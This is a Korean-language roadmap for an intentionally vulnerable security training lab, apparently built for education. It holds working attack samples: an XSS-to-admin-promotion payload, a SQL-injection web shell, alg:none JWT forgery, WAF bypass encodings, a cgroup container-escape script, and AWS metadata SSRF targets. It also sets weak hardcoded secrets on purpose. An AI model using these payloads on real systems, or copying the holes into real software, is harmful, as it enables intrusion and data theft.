# 🎯 Phase 3: 고급 실습 환경 및 복합 시나리오

**목표**: 실무에 가까운 복합 보안 시나리오 및 마이크로서비스 환경 구축  
**우선순위**: MEDIUM  
**예상 기간**: 4-6주  

## 🏗️ **1단계: 마이크로서비스 아키텍처 시뮬레이션**

### 다중 언어 서비스 구성
```yaml
# docker-compose.yml 마이크로서비스 확장
version: '3.8'
services:
  # Frontend (기존 PHP)
  php-frontend:
    build: ./php-frontend
    ports:
      - "80:80"
    depends_on:
      - nodejs-api
      - python-ml
      - golang-gateway

  # REST API (Node.js)
  nodejs-api:
    build: ./nodejs-api
    ports:
      - "3003:3000"
    environment:
      - JWT_SECRET=vulnerable_secret_key
      - DB_HOST=postgres
    depends_on:
      - postgres
      - mongodb

  # ML/AI Service (Python)
  python-ml:
    build: ./python-ml
    ports:
      - "5000:5000"
    environment:
      - FLASK_ENV=development
      - ML_MODEL_PATH=/app/models
    volumes:
      - ./ml-models:/app/models

  # API Gateway (Go)
  golang-gateway:
    build: ./golang-gateway
    ports:
      - "8080:8080"
    environment:
      - RATE_LIMIT=100
      - AUTH_SERVICE=nodejs-api:3000

  # Load Balancer
  nginx-lb:
    build: ./nginx-lb
    ports:
      - "443:443"
    depends_on:
      - php-frontend
      - golang-gateway
    volumes:
      - ./nginx-lb/ssl:/etc/nginx/ssl

  # Monitoring
  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
```

## 🎯 **2단계: 복합 공격 체인 시나리오**

### Scenario 1: XSS → CSRF → Privilege Escalation
```javascript
// 공격 체인 시뮬레이션 모듈
const attackChainScenario = {
    title: "Advanced Attack Chain: XSS → CSRF → Privilege Escalation",
    description: "실제 공격자가 사용하는 다단계 공격 시나리오를 시뮬레이션",
    
    phases: [
        {
            name: "Phase 1: Initial XSS",
            description: "게시물에 XSS 페이로드 삽입",
            payload: `
                <script>
                // 1단계: CSRF 토큰 탈취
                fetch('/get-csrf-token')
                    .then(response => response.json())
                    .then(data => {
                        // 2단계: 관리자 권한 요청 (CSRF)
                        return fetch('/admin/promote-user', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-CSRF-Token': data.token
                            },
                            body: JSON.stringify({
                                userId: 'attacker_id',
                                role: 'admin'
                            })
                        });
                    })
                    .then(() => {
                        // 3단계: 권한 상승 확인
                        window.location = '/admin/dashboard';
                    });
                </script>
            `,
            impact: "관리자가 해당 게시물을 볼 때 자동으로 공격자에게 관리자 권한 부여"
        }
    ]
};
```

### Scenario 2: SQL Injection → RCE → Lateral Movement
```php
// 복합 공격 시뮬레이션 클래스
class AdvancedAttackChain {
    
    public function sqlInjectionToRCE($userInput) {
        // 1단계: SQL Injection으로 파일 생성
        $vulnerableQuery = "SELECT * FROM users WHERE id = '$userInput'";
        
        // 공격 페이로드: '; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --
        
        // 2단계: 웹쉘을 통한 원격 명령 실행
        $shellAccess = $this->executeWebShell("cat /etc/passwd");
        
        // 3단계: 내부 네트워크 스캔 (Lateral Movement)
        $networkScan = $this->scanInternalNetwork();
        
        return [
            'sql_injection' => $vulnerableQuery,
            'rce_result' => $shellAccess,
            'lateral_movement' => $networkScan
        ];
    }
    
    private function scanInternalNetwork() {
        $internalIPs = [];
        for ($i = 1; $i <= 255; $i++) {
            $ip = "192.168.1.$i";
            // 내부 서비스 스캔 시뮬레이션
            if ($this->pingHost($ip)) {
                $internalIPs[] = $ip;
            }
        }
        return $internalIPs;
    }
}
```

### Scenario 3: JWT Manipulation → API Abuse → Data Exfiltration
```javascript
// JWT 조작을 통한 API 남용 시나리오
const jwtAttackChain = {
    title: "JWT Attack Chain",
    
    // 1단계: JWT 토큰 분석 및 조작
    analyzeJWT: function(token) {
        const [header, payload, signature] = token.split('.');
        const decodedHeader = JSON.parse(atob(header));
        const decodedPayload = JSON.parse(atob(payload));
        
        return {
            header: decodedHeader,
            payload: decodedPayload,
            vulnerabilities: this.checkJWTVulnerabilities(decodedHeader, decodedPayload)
        };
    },
    
    // 2단계: 알고리즘 혼동 공격 (alg: none)
    createNoneAlgorithmToken: function(payload) {
        const header = { "alg": "none", "typ": "JWT" };
        const encodedHeader = btoa(JSON.stringify(header));
        const encodedPayload = btoa(JSON.stringify(payload));
        
        return encodedHeader + '.' + encodedPayload + '.';
    },
    
    // 3단계: 대량 API 호출을 통한 데이터 추출
    extractData: async function(manipulatedToken) {
        const dataEndpoints = [
            '/api/users',
            '/api/transactions',
            '/api/sensitive-data'
        ];
        
        const extractedData = {};
        for (const endpoint of dataEndpoints) {
            try {
                const response = await fetch(endpoint, {
                    headers: {
                        'Authorization': 'Bearer ' + manipulatedToken
                    }
                });
                extractedData[endpoint] = await response.json();
            } catch (error) {
                extractedData[endpoint] = { error: error.message };
            }
        }
        
        return extractedData;
    }
};
```

## 🎯 **3단계: 실제 환경 시뮬레이션**

### WAF(Web Application Firewall) 우회 시나리오
```nginx
# nginx-waf/waf-rules.conf
# 시뮬레이션된 WAF 규칙
location / {
    # SQL Injection 패턴 차단
    if ($args ~* "union.*select|script.*>|<.*script") {
        return 403;
    }
    
    # 하지만 우회 가능한 약점 존재
    # 예: URL 인코딩, 대소문자 혼용 등으로 우회 가능
    
    proxy_pass http://backend;
}
```

```javascript
// WAF 우회 기법 모듈
const wafBypassTechniques = {
    title: "WAF Bypass Techniques",
    
    techniques: [
        {
            name: "URL Encoding",
            original: "' UNION SELECT * FROM users--",
            bypassed: "%27%20UNION%20SELECT%20*%20FROM%20users--"
        },
        {
            name: "Case Variation", 
            original: "<script>alert(1)</script>",
            bypassed: "<ScRiPt>alert(1)</ScRiPt>"
        },
        {
            name: "Comment Insertion",
            original: "UNION SELECT",
            bypassed: "UNION/**/SELECT"
        },
        {
            name: "Double Encoding",
            original: "'",
            bypassed: "%2527"
        }
    ]
};
```

### Container Escape 시나리오
```dockerfile
# 의도적으로 취약한 컨테이너 설정
FROM alpine:latest

# 취약점: privileged mode, host 네트워크 노출
# docker run --privileged --net=host vulnerable-container

# Container Escape 시뮬레이션
RUN echo '#!/bin/bash' > /escape.sh && \
    echo 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x' >> /escape.sh && \
    echo 'echo 1 > /tmp/cgrp/x/notify_on_release' >> /escape.sh && \
    echo 'host_path=`sed -n "s/.*\perdir=\([^,]*\).*/\1/p" /etc/mtab`' >> /escape.sh && \
    echo 'echo "$host_path/escape.sh" > /tmp/cgrp/release_agent' >> /escape.sh && \
    chmod +x /escape.sh
```

## 🎯 **4단계: 클라우드 보안 시나리오**

### AWS S3 버킷 오설정 시뮬레이션
```javascript
// S3 버킷 취약점 시뮬레이션 (MinIO 사용)
const s3SecurityTest = {
    title: "Cloud Storage Security Testing",
    
    // MinIO 서버 설정 (S3 호환)
    setupMinIO: function() {
        return {
            endpoint: 'http://minio:9000',
            accessKey: 'admin',
            secretKey: 'password',
            bucket: 'vulnerable-bucket'
        };
    },
    
    // 퍼블릭 읽기 권한 오설정
    testPublicRead: async function() {
        const bucketPolicy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": "*",
                    "Action": "s3:GetObject",
                    "Resource": "arn:aws:s3:::vulnerable-bucket/*"
                }
            ]
        };
        
        // 민감한 파일들이 퍼블릭 접근 가능한 상황 시뮬레이션
        return this.listSensitiveFiles();
    },
    
    // 서버 사이드 요청 변조 (SSRF)를 통한 메타데이터 접근
    testSSRFToMetadata: function() {
        const metadataEndpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        ];
        
        return metadataEndpoints.map(endpoint => ({
            url: endpoint,
            description: "AWS 인스턴스 메타데이터 서비스 접근"
        }));
    }
};
```

## 🛠️ **구현 일정**

### Week 1-2: 마이크로서비스 아키텍처
- [ ] 다중 언어 서비스 컨테이너 구축 (Node.js, Python, Go)
- [ ] API Gateway 및 Load Balancer 설정
- [ ] 서비스 간 통신 및 인증 체계 구축

### Week 3-4: 복합 공격 체인
- [ ] XSS → CSRF → Privilege Escalation 시나리오
- [ ] SQL Injection → RCE → Lateral Movement 체인
- [ ] JWT 조작 → API 남용 → 데이터 추출 시나리오

### Week 5-6: 고급 환경 시뮬레이션
- [ ] WAF 우회 기법 모듈
- [ ] Container Escape 시나리오
- [ ] 클라우드 보안 (S3/MinIO) 테스트 환경
- [ ] 전체 시스템 통합 및 최적화

## 📊 **최종 성과 예상**

### 🎯 **기술적 혁신**
- **실무급 시나리오**: 실제 해커가 사용하는 공격 체인 완벽 재현
- **마이크로서비스**: 현대적 아키텍처에서의 보안 취약점 학습
- **클라우드 보안**: AWS/클라우드 환경 보안 실습
- **복합 공격**: 단일 취약점이 아닌 연쇄 공격 시나리오

### 🏆 **세계 최고 수준 달성**
- **100+ 보안 모듈**: Phase 1-3 완료 시 총 100개 이상
- **다중 환경**: PHP, Node.js, Python, Go, 클라우드
- **실시간 실행**: 모든 코드를 즉시 실행하고 결과 확인
- **교육 효과**: 이론 + 실습을 완벽히 결합한 최고의 학습 경험

## 🚀 **최종 비전**

Phase 3 완료 시 **S_WEB_Project**는:

🌍 **세계에서 가장 포괄적인 보안 실습 플랫폼**
- 실제 해커 기법 완벽 재현
- 현대적 아키텍처 (마이크로서비스, 클라우드)
- 실무진이 인정하는 교육 효과

🎓 **차세대 보안 전문가 양성의 표준**
- 대학교 보안 교육 필수 플랫폼
- 기업 보안 교육 표준 도구
- 국제 보안 컨퍼런스 주목

**결론**: 이 로드맵을 따라 구현하면 **업계를 혁신하는 보안 교육 플랫폼**이 완성됩니다! 🎉